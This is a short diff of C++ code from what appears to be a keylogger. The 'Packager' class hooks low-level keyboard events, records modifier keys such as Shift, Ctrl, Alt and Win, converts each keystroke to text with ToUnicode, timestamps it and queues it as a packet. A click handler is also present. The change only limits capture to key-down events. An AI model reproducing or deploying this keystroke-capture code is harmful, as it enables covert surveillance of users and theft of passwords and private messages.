@@ -60,41 +60,43 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	_altGr = (info->vkCode == 165 && wParam == 257) ? false : _altGr;
 
 
-	BYTE kbdState[256];
-	GetKeyboardState(kbdState);
-	WCHAR buff[2];
+	if (wParam != 257) {
+		BYTE kbdState[256];
+		GetKeyboardState(kbdState);
+		WCHAR buff[2];
 
-	PaquetKeys *tmp = new PaquetKeys();
-	tmp->setDate(info->time);
-	std::string  str;
-	if (_shift) {
-		str += "[MAJ] ";
+		PaquetKeys *tmp = new PaquetKeys();
+		tmp->setDate(info->time);
+		std::string  str;
+		if (_shift) {
+			str += "[MAJ] ";
+		}
+		if (_ctrl) {
+			str += "[CTRL] ";
+		}
+		if (_win) {
+			str += "[WIN] ";
+		}
+		if (_alt) {
+			str += "[ALT] ";
+		}
+		if (_altGr) {
+			str += "[ALT GR] ";
+		}
+		if ((info->vkCode != 13 && info->vkCode != 8) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
+			std::wstring ws(buff);
+			str.append(ws.begin(), ws.end());
+		}
+		else {
+			str += correspondance[info->vkCode];
+		}
+		std::cout << "string UNICODE : " << str << std::endl;
+		tmp->setText(str);
+		tmp->createPaquet();
+		mutex.lock();
+		_paquets.push_back(tmp);
+		mutex.unlock();
 	}
-	if (_ctrl) {
-		str += "[CTRL] ";
-	}
-	if (_win) {
-		str += "[WIN] ";
-	}
-	if (_alt) {
-		str += "[ALT] ";
-	}
-	if (_altGr) {
-		str += "[ALT GR] ";
-	}
-	if ((info->vkCode != 13 && info->vkCode != 8) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
-		std::wstring ws(buff);
-		str.append(ws.begin(), ws.end());
-	}
-	else {
-		str += correspondance[info->vkCode];
-	}
-	std::cout << "string UNICODE : " << str << std::endl;
-	tmp->setText(str);
-	tmp->createPaquet();
-	mutex.lock();
-	_paquets.push_back(tmp);
-	mutex.unlock();
 }
 
 void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
